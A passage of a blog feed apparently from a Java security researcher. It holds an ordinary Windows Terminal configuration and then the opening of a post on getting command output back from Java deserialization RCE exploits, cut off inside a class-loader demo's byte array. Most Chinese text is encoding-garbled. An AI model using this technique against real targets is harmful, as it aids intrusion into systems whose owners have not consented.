class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// To view the default settings, hold "alt" while clicking on the "Settings" button.</span></span><br><span class="line"><span class="comment">// For documentation on these settings, see: https://aka.ms/terminal-documentation</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"$schema"</span>: <span class="string">"https://aka.ms/terminal-profiles-schema"</span>,</span><br><span class="line"><span class="comment">// é»˜è®¤æ‰“å¼€çª—å£guid</span></span><br><span class="line"><span class="string">"defaultProfile"</span>: <span class="string">"&#123;0caa0dad-35be-5f56-a8ff-afceeeaa6101&#125;"</span>,</span><br><span class="line"><span class="string">"profiles"</span>: [</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Make changes here to the cmd.exe profile</span></span><br><span class="line"><span class="string">"guid"</span>: <span class="string">"&#123;0caa0dad-35be-5f56-a8ff-afceeeaa6101&#125;"</span>,</span><br><span class="line"><span class="string">"name"</span>: <span class="string">"CMD"</span>,</span><br><span class="line"><span class="string">"commandline"</span>: <span class="string">"cmd.exe"</span>,</span><br><span class="line"><span class="string">"hidden"</span>: <span class="keyword">false</span>,</span><br><span class="line"><span class="string">"acrylicOpacity"</span>: <span class="number">0.75</span>,</span><br><span class="line"><span class="comment">// èƒŒæ™¯å›¾ç‰‡</span></span><br><span class="line"><span class="string">"backgroundImage"</span>: <span class="string">"D:\\Git\\icon\\13.jpg"</span>,</span><br><span class="line"><span class="string">"backgroundImageOpacity"</span>: <span class="number">0.9</span>,</span><br><span class="line"><span class="string">"closeOnExit"</span>: <span class="keyword">true</span>,</span><br><span class="line"><span class="string">"colorScheme"</span>: <span class="string">"CMD"</span>,</span><br><span class="line"><span class="comment">//"commandline": "cmd.exe",</span></span><br><span class="line"><span class="string">"cursorColor"</span>: <span class="string">"#FFFFFF"</span>,</span><br><span class="line"><span class="comment">// å…‰æ ‡</span></span><br><span class="line"><span class="string">"cursorShape"</span>: <span class="string">"underscore"</span>,</span><br><span class="line"><span class="string">"fontFace"</span>: <span class="string">"Consolas"</span>,</span><br><span class="line"><span class="string">"fontSize"</span>: <span class="number">12</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">"historySize"</span>: <span class="number">9001</span>,</span><br><span class="line"><span class="string">"icon"</span>: <span class="string">"ms-appx:///ProfileIcons/&#123;0caa0dad-35be-5f56-a8ff-afceeeaa6101&#125;.png"</span>,</span><br><span class="line"><span class="comment">//"name": "cmd",</span></span><br><span class="line"><span class="string">"padding"</span>: <span class="string">"0, 0, 0, 0"</span>,</span><br><span class="line"><span class="string">"snapOnInput"</span>: <span class="keyword">true</span>,</span><br><span class="line"><span class="comment">// æ‰“å¼€çª—å£çš„è·¯å¾„</span></span><br><span class="line"><span class="string">"startingDirectory"</span>: <span class="string">"./"</span>,</span><br><span class="line"><span class="string">"tabTitle"</span>: <span class="string">"CMD"</span>,</span><br><span class="line"><span class="string">"useAcrylic"</span>: <span class="keyword">false</span></span><br><span class="line"></span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Make changes here to the powershell.exe profile</span></span><br><span class="line"><span class="string">"guid"</span>: <span class="string">"&#123;61c54bbd-c2c6-5271-96e7-009a87ff44bf&#125;"</span>,</span><br><span class="line"><span class="string">"name"</span>: <span class="string">"Windows PowerShell"</span>,</span><br><span class="line"><span class="string">"commandline"</span>: <span class="string">"powershell.exe"</span>,</span><br><span class="line"><span class="string">"hidden"</span>: <span class="keyword">false</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">"acrylicOpacity"</span>: <span class="number">0.5</span>,</span><br><span class="line"><span class="string">"background"</span>: <span class="string">"#000000"</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">"backgroundImage"</span>: <span class="string">"D:\\Git\\icon\\7s'd.jpg"</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">"backgroundImageOpacity"</span>: <span class="number">0.9</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">"closeOnExit"</span>: <span class="keyword">true</span>,</span><br><span class="line"><span class="string">"colorScheme"</span>: <span class="string">"CMD"</span>,</span><br><span class="line"></span><br><span class="line"><span class="comment">// "commandline": "powershell.exe",</span></span><br><span class="line"><span class="string">"cursorColor"</span>: <span class="string">"#FFFFFF"</span>,</span><br><span class="line"><span class="comment">// å…‰æ ‡</span></span><br><span class="line"><span class="string">"cursorShape"</span>: <span class="string">"underscore"</span>,</span><br><span class="line"><span class="string">"fontFace"</span>: <span class="string">"Consolas"</span>,</span><br><span class="line"><span class="string">"fontSize"</span>: <span class="number">12</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">"historySize"</span>: <span class="number">9001</span>,</span><br><span class="line"><span class="string">"icon"</span>: <span class="string">"ms-appx:///ProfileIcons/&#123;61c54bbd-c2c6-5271-96e7-009a87ff44bf&#125;.png"</span>,</span><br><span class="line"><span class="string">"padding"</span>: <span class="string">"0, 0, 0, 0"</span>,</span><br><span class="line"><span class="string">"snapOnInput"</span>: <span class="keyword">true</span>,</span><br><span class="line"><span class="string">"startingDirectory"</span>: <span class="string">"./"</span>,</span><br><span class="line"><span class="string">"tabTitle"</span>: <span class="string">"Powershell"</span>,</span><br><span class="line"><span class="string">"useAcrylic"</span>: <span class="keyword">true</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"guid"</span>: <span class="string">"&#123;b453ae62-4e3d-5e58-b989-0a998ec441b8&#125;"</span>,</span><br><span class="line"><span class="string">"hidden"</span>: <span class="keyword">false</span>,</span><br><span class="line"><span class="string">"name"</span>: <span class="string">"Azure Cloud Shell"</span>,</span><br><span class="line"><span class="string">"source"</span>: <span class="string">"Windows.Terminal.Azure"</span></span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//git-bash</span></span><br><span class="line"><span class="string">"tabTitle"</span>: <span class="string">"Git-bash"</span>,</span><br><span class="line"><span class="string">"acrylicOpacity"</span>: <span class="number">0.5</span>,</span><br><span class="line"><span class="string">"backgroundImage"</span>: <span class="string">"D:\\Git\\icon\\3.jpg"</span>,</span><br><span class="line"><span class="string">"closeOnExit"</span>: <span class="keyword">true</span>,</span><br><span class="line"><span class="string">"colorScheme"</span>: <span class="string">"Brogrammer"</span>,</span><br><span class="line"><span class="string">"commandline"</span>: <span class="string">"D:\\Git\\bin\\bash.exe"</span>,</span><br><span class="line"><span class="string">"cursorColor"</span>: <span class="string">"#FFFFFF"</span>,</span><br><span class="line"><span class="string">"cursorShape"</span>: <span class="string">"bar"</span>,</span><br><span class="line"><span class="string">"fontFace"</span>: <span class="string">"Fira Code Medium"</span>,</span><br><span class="line"><span class="string">"fontSize"</span>: <span class="number">12</span>,</span><br><span class="line"><span class="string">"guid"</span>: <span class="string">"&#123;1c4de342-38b7-51cf-b940-2309a097f489&#125;"</span>,</span><br><span class="line"><span class="string">"historySize"</span>: <span class="number">9001</span>,</span><br><span class="line"><span class="comment">// "icon": "E:\\Git\\git-icon.png", </span></span><br><span class="line"><span class="string">"icon"</span>: <span class="string">"D:\\Git\\icon\\1.jpg"</span>,</span><br><span class="line"><span class="string">"name"</span>: <span class="string">"Bash"</span>,</span><br><span class="line"><span class="string">"padding"</span>: <span class="string">"10, 10, 10, 10"</span>,</span><br><span class="line"><span class="string">"snapOnInput"</span>: <span class="keyword">true</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">"startingDirectory"</span>: <span class="string">"./"</span>,</span><br><span class="line"><span class="string">"useAcrylic"</span>: <span class="keyword">true</span></span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"tabTitle"</span>: <span class="string">"Ubuntu (WSL)"</span>,</span><br><span class="line"><span class="comment">//"tabTitle": "Ubuntu (WSL)",</span></span><br><span class="line"><span class="string">"acrylicOpacity"</span>: <span class="number">0.1</span>,</span><br><span class="line"><span class="string">"backgroundImage"</span>: <span class="string">"D:\\Git\\icon\\4.jpg"</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">"backgroundImageOpacity"</span>: <span class="number">0.9</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">"closeOnExit"</span>: <span class="keyword">true</span>,</span><br><span class="line"><span class="string">"colorScheme"</span>: <span class="string">"Campbell"</span>,</span><br><span class="line"><span class="comment">//"colorScheme": "CMD",</span></span><br><span class="line"><span class="string">"commandline"</span>: <span class="string">"wsl.exe -d Ubuntu"</span>,</span><br><span class="line"><span class="string">"cursorColor"</span>: <span class="string">"#FFFFFF"</span>,</span><br><span class="line"><span class="string">"cursorShape"</span>: <span class="string">"bar"</span>,</span><br><span class="line"><span class="string">"fontFace"</span>: <span class="string">"Consolas"</span>,</span><br><span class="line"><span class="string">"fontSize"</span>: <span class="number">13</span>,</span><br><span class="line"><span class="string">"guid"</span>: <span class="string">"&#123;2c4de342-38b7-51cf-b940-2309a097f518&#125;"</span>,</span><br><span class="line"><span class="string">"historySize"</span>: <span class="number">9001</span>,</span><br><span class="line"><span class="string">"icon"</span>: <span class="string">"ms-appx:///ProfileIcons/&#123;9acb9455-ca41-5af7-950f-6bca1bc9722f&#125;.png"</span>,</span><br><span class="line"><span class="string">"name"</span>: <span class="string">"Ubuntu"</span>,</span><br><span class="line"><span class="string">"padding"</span>: <span class="string">"0, 0, 0, 0"</span>,</span><br><span class="line"><span class="string">"snapOnInput"</span>: <span class="keyword">true</span>,</span><br><span class="line"><span class="string">"useAcrylic"</span>: <span class="keyword">true</span>,</span><br><span class="line"><span class="string">"startingDirectory"</span>: <span class="string">"./"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">],</span><br><span class="line"></span><br><span class="line"><span class="comment">// Add custom color schemes to this array</span></span><br><span class="line"><span class="string">"schemes"</span>: [</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"background"</span>: <span class="string">"#000000"</span>,</span><br><span class="line"><span class="string">"black"</span>: <span class="string">"#0C0C0C"</span>,</span><br><span class="line"><span class="string">"blue"</span>: <span class="string">"#0037DA"</span>,</span><br><span class="line"><span class="string">"brightBlack"</span>: <span class="string">"#767676"</span>,</span><br><span class="line"><span class="string">"brightBlue"</span>: <span class="string">"#3B78FF"</span>,</span><br><span class="line"><span class="string">"brightCyan"</span>: <span class="string">"#61D6D6"</span>,</span><br><span class="line"><span class="string">"brightGreen"</span>: <span class="string">"#16C60C"</span>,</span><br><span class="line"><span class="string">"brightPurple"</span>: <span class="string">"#B4009E"</span>,</span><br><span class="line"><span class="string">"brightRed"</span>: <span class="string">"#E74856"</span>,</span><br><span class="line"><span class="string">"brightWhite"</span>: <span class="string">"#F2F2F2"</span>,</span><br><span class="line"><span class="string">"brightYellow"</span>: <span class="string">"#F9F1A5"</span>,</span><br><span class="line"><span class="string">"cyan"</span>: <span class="string">"#3A96DD"</span>,</span><br><span class="line"><span class="string">"foreground"</span>: <span class="string">"#FFFFFF"</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">"green"</span>: <span class="string">"#13A10E"</span>,</span><br><span class="line"><span class="string">"name"</span>: <span class="string">"CMD"</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">"purple"</span>: <span class="string">"#881798"</span>,</span><br><span class="line"><span class="string">"red"</span>: <span class="string">"#C50F1F"</span>,</span><br><span class="line"><span class="string">"white"</span>: <span class="string">"#CCCCCC"</span>,</span><br><span class="line"><span class="string">"yellow"</span>: <span class="string">"#C19C00"</span></span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"background"</span>: <span class="string">"#000000"</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">"black"</span>: <span class="string">"#0C0C0C"</span>,</span><br><span class="line"><span class="string">"blue"</span>: <span class="string">"#0037DA"</span>,</span><br><span class="line"><span class="string">"brightBlack"</span>: <span class="string">"#767676"</span>,</span><br><span class="line"><span class="string">"brightBlue"</span>: <span class="string">"#3B78FF"</span>,</span><br><span class="line"><span class="string">"brightCyan"</span>: <span class="string">"#61D6D6"</span>,</span><br><span class="line"><span class="string">"brightGreen"</span>: <span class="string">"#16C60C"</span>,</span><br><span class="line"><span class="string">"brightPurple"</span>: <span class="string">"#B4009E"</span>,</span><br><span class="line"><span class="string">"brightRed"</span>: <span class="string">"#E74856"</span>,</span><br><span class="line"><span class="string">"brightWhite"</span>: <span class="string">"#F2F2F2"</span>,</span><br><span class="line"><span class="string">"brightYellow"</span>: <span class="string">"#F9F1A5"</span>,</span><br><span class="line"><span class="string">"cyan"</span>: <span class="string">"#3A96DD"</span>,</span><br><span class="line"><span class="string">"foreground"</span>: <span class="string">"#FFFFFF"</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">"green"</span>: <span class="string">"#13A10E"</span>,</span><br><span class="line"><span class="string">"name"</span>: <span class="string">"Brogrammer"</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">"purple"</span>: <span class="string">"#881798"</span>,</span><br><span class="line"><span class="string">"red"</span>: <span class="string">"#C50F1F"</span>,</span><br><span class="line"><span class="string">"white"</span>: <span class="string">"#CCCCCC"</span>,</span><br><span class="line"><span class="string">"yellow"</span>: <span class="string">"#C19C00"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">],</span><br><span class="line"></span><br><span class="line"><span class="comment">// Add any keybinding overrides to this array.</span></span><br><span class="line"><span class="comment">// To unbind a default keybinding, set the command to "unbound"</span></span><br><span class="line"><span class="string">"keybindings"</span>: [</span><br><span class="line"><span class="comment">// å…³é—­æ‰€æœ‰çš„çª—å£</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"command"</span>: <span class="string">"closeWindow"</span>,</span><br><span class="line"><span class="string">"keys"</span>: [ <span class="string">"ctrl+q"</span> ]</span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">// æ–°å»ºä¸€ä¸ªçª—å£</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"command"</span>: &#123;</span><br><span class="line"><span class="string">"action"</span>: <span class="string">"newTab"</span>,</span><br><span class="line"><span class="string">"commandline"</span>: <span class="string">""</span>,</span><br><span class="line"><span class="string">"startingDirectory"</span>: <span class="string">"./"</span>,</span><br><span class="line"><span class="string">"tabTitle"</span>: <span class="string">"CMD"</span>,</span><br><span class="line"><span class="string">"index"</span>: <span class="number">0</span>,</span><br><span class="line"><span class="string">"profile"</span>: <span class="string">"CMD"</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="string">"keys"</span>: [ <span class="string">"alt+q"</span> ]</span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">// å¤åˆ¶å¿«æ·é”®</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"command"</span>: &#123;</span><br><span class="line"><span class="string">"action"</span>: <span class="string">"copy"</span>,</span><br><span class="line"><span class="string">"singleLine"</span>: <span class="keyword">false</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="string">"keys"</span>: [ <span class="string">"ctrl+c"</span> ]</span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">// ç²˜è´´å¿«æ·é”®</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"command"</span>: <span class="string">"paste"</span>,</span><br><span class="line"><span class="string">"keys"</span>: [ <span class="string">"ctrl+v"</span> ]</span><br><span class="line">&#125;</span><br><span class="line">]</span><br><span class="line"><span class="comment">// å…³é—­å½“å‰é€‰é¡¹å¡</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"command"</span>: <span class="string">"closeTab"</span>,</span><br><span class="line"><span class="string">"keys"</span>: [</span><br><span class="line"><span class="string">"shift+q"</span></span><br><span class="line">]</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://github.com/microsoft/terminal/blob/master/doc/cascadia/SettingsSchema.md" target="_blank" rel="noopener">https://github.com/microsoft/terminal/blob/master/doc/cascadia/SettingsSchema.md</a><br><a href="https://www.cnblogs.com/KiraYoshikage/p/11443741.html" target="_blank" rel="noopener">https://www.cnblogs.com/KiraYoshikage/p/11443741.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=
      
    
    </summary>
    
    
      <category term="ä»£ç å®¡è®¡" scheme="https://summersec.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="Java ååºåˆ—åŒ–" scheme="https://summersec.github.io/tags/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Javaååºåˆ—åŒ–é“¾å›æ˜¾è§£å†³æ–¹æ¡ˆ</title>
    <link href="https://summersec.github.io/2020/06/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
    <id>https://summersec.github.io/2020/06/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</id>
    <published>2020-06-01T11:01:42.000Z</published>
    <updated>2021-01-18T06:18:54.545Z</updated>
    
    <content type="html"><![CDATA[<h1 id="é¢˜å¤–è¯"><a href="#é¢˜å¤–è¯" class="headerlink" title="é¢˜å¤–è¯"></a>é¢˜å¤–è¯</h1><p>&emsp;&emsp; è¿™æ˜¯ä¸€ç¯‡æœ¬åº”è¯¥æ—©å°±å®Œæˆçš„æ–‡ç« ï¼Œä½†æ˜¯ç”±äºå„ç§åŸå› æ‹–å»¶è‡³æ­¤ã€‚ä¹‹å‰æœ‰è¯»è€…å°±å‚¬æˆ‘ï¼Œä½†æ˜¯å®åœ¨æ˜¯å„ç§äº‹æƒ…ç¼ èº«ï¼ŒåŠ ä¸Šè‡ªå·±é¢“åºŸäº†ä¸€æ®µæ—¶é—´å¯¼è‡´ç°åœ¨æ‰å…¬å¸ƒã€‚ä¹‹åå¯èƒ½ä¼šæ–­æ›´ä¸€æ®µæ—¶é—´å…³äºä»£ç å®¡è®¡æ–¹é¢æ–‡ç« ï¼Œæ—¶é—´æš‚ä¸ç¡®å®šã€‚å…¶å®æœ‰å‡ ä¸ªé¢˜ææ—©ä¹Ÿç¡®å®šï¼Œä½†æ˜¯å®åœ¨æ˜¯æ²¡æ—¶é—´å»æ•´ç†ç´ æï¼ŒåŠ ä¸Šé¡¹ç›®çš„æ›´æ–°ï¼Œè®©æˆ‘å˜å¾—æ›´åŠ ç¹å¿™ï¼Œåœ¨æ­¤ç»™ä½å…ˆè¯´ä¸€å£°å¯¹ä¸èµ·ã€‚</p><hr><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>&emsp;&emsp; å¤§å¤šæ•°Javaååºåˆ—åŒ–æ¼æ´éƒ½èƒ½æ‰§è¡Œå‘½ä»¤ï¼Œå¯¼è‡´RCEã€‚å°ä¼™ä¼´ä»¬æœ‰æ²¡æœ‰æƒ³è¿‡ç½‘ç»œä¸Šå¤§å¤šæ•°<code>payload</code>éƒ½æ˜¯ä»¥å¼¹è®¡ç®—æœºä¸ºæ­¢ï¼Œä½†ç›®æ ‡ä¸»æœºæœ‰æ²¡æœ‰å¼¹è®¡ç®—æœºï¼Œæˆ–è€…æ‰§è¡Œå…¶ä»–çš„å‘½ä»¤çš„æ—¶å€™æˆ‘ä»¬æ˜¯å¹¶ä¸çŸ¥é“çš„ï¼Œå› ä¸ºæ²¡æœ‰å›æ˜¾ä»»ä½•çš„ç»“æœã€‚è¿™ç¯‡æ–‡ç« ä»¥ååºåˆ—åŒ–æ¼æ´çš„å›æ˜¾ä¸ºé¢˜ï¼Œæ•™ä½ è§£å†³å¦‚ä½•è§£å†³ååºåˆ—åŒ–æ¼æ´å›æ˜¾ã€‚</p><p>PS: ä¸ºé¿å…ä»£ç å¤ªé•¿è€Œå¯¼è‡´çš„é˜…è¯»æ•ˆæœï¼Œæ•…å°†å®Œæ•´çš„å®éªŒä»£ç å…¨éƒ¨å·²ç»ä¸Šä¼ è‡³ <a href="https://github.com/SummerSec/JavaLearnVulnerability" target="_blank" rel="noopener">https://github.com/SummerSec/JavaLearnVulnerability</a></p><hr><h1 id="defineclasså¼‚å¸¸å›æ˜¾"><a href="#defineclasså¼‚å¸¸å›æ˜¾" class="headerlink" title="defineclasså¼‚å¸¸å›æ˜¾"></a>defineclasså¼‚å¸¸å›æ˜¾</h1><p>&emsp;&emsp; defineclassæ˜¯<code>java.lang.ClassLoader</code>ç±»ä¸‹çš„ä¸€ä¸ªç±»æ–¹æ³•ï¼Œå°†å­—èŠ‚ç è½¬åŒ–ä¸ºClassç±»ã€‚<br><img src="https://img-blog.csdnimg.cn/20200605103739371.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20200605103901837.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><hr><h2 id="ClassLoder-ç±»åŠ è½½æœºåˆ¶"><a href="#ClassLoder-ç±»åŠ è½½æœºåˆ¶" class="headerlink" title="ClassLoder ç±»åŠ è½½æœºåˆ¶"></a>ClassLoder ç±»åŠ è½½æœºåˆ¶</h2><p>&emsp;&emsp; Javaæ˜¯ä¸€ä¸ªä¾èµ–äºJVM(Javaè™šæ‹Ÿæœº)å®ç°çš„è·¨å¹³å°çš„å¼€å‘è¯­è¨€ã€‚Javaç¨‹åºåœ¨è¿è¡Œå‰éœ€è¦å…ˆç¼–è¯‘æˆclassæ–‡ä»¶ï¼ŒJavaç±»åˆå§‹åŒ–çš„æ—¶å€™ä¼šè°ƒç”¨<code>java.lang.ClassLoader</code>åŠ è½½ç±»å­—èŠ‚ç ï¼ŒClassLoaderä¼šè°ƒç”¨JVMçš„nativeæ–¹æ³•(defineClass0/1/2)æ¥å®šä¹‰ä¸€ä¸ªjava.lang.Classå®ä¾‹ã€‚</p><p><img src="https://img-blog.csdnimg.cn/20200524095720286.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>&emsp;&emsp; ç±»åŠ è½½å™¨æœ‰ä¸‰ä¸ªï¼Œæ ¹åŠ è½½å™¨<code>Bootstrap</code>ã€å¹³å°ç±»åŠ è½½å™¨<code>PlatformClassLoader</code>ä»¥åŠç”¨æˆ·ç±»åŠ è½½å™¨<code>AppClassLoader</code>ã€‚ç”¨æˆ·ä¹Ÿå¯ä»¥è‡ªå®šä¹‰ç±»åŠ è½½å™¨ï¼Œè‡ªå®šä¹‰çš„ç±»åŠ è½½å™¨éœ€è¦ç»§æ‰¿<code>ClassLoader</code>ç±»ã€‚</p><p><img src="https://img-blog.csdnimg.cn/20200524110624558.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><hr><h2 id="ç±»åŠ è½½demo"><a href="#ç±»åŠ è½½demo" class="headerlink" title="ç±»åŠ è½½demo"></a>ç±»åŠ è½½demo</h2><p>&emsp;&emsp; ä¸‹é¢ç»™å‡ºçš„æ˜¯ä¸€ä¸ªå®Œæ•´çš„ç”¨æˆ·è‡ªå®šä¹‰åŠ è½½å™¨åŠ è½½ç±»å­—èŠ‚ç çš„DEMOï¼ŒSummerç±»å­—èŠ‚ç æ€ä¹ˆè·å–ä¸‹æ–‡ä¼šè®²è§£ï¼Œç›®å‰å…ˆçœ‹ä¸€ä¸‹ç±»åŠ è½½å™¨çš„å®ç°ã€‚</p><blockquote><p>æ¸©é¦¨æç¤ºï¼šå¦‚æœä½¿ç”¨ç¬”è€…åœ¨GitHubä¸Šé¡¹ç›®ï¼Œè¯·å…ˆå°†Summerç±»åˆ é™¤ï¼Œæˆ–è€…ç§»åˆ°å…¶ä»–åœ°æ–¹ã€‚</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">demo2</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Summerç±»å</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String testClassName = <span class="string">"summer.classload.Summer"</span>;</span><br><span class="line">    <span class="comment">// Summer.classç±»å­—èŠ‚ç </span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] testClassBytes = <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;</span><br><span class="line">            -<span class="number">54</span>, -<span class="number">2</span>, -<span class="number">70</span>, -<span class="number">66</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">52</span>, <span class="number">0</span>, <span class="number">96</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">53</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">54</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">55</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">56</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">57</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">58</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">59</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">60</span>, <span class="number">0</span>, <span class="number">61</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">62</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">63</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">64</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">9</span>, <span 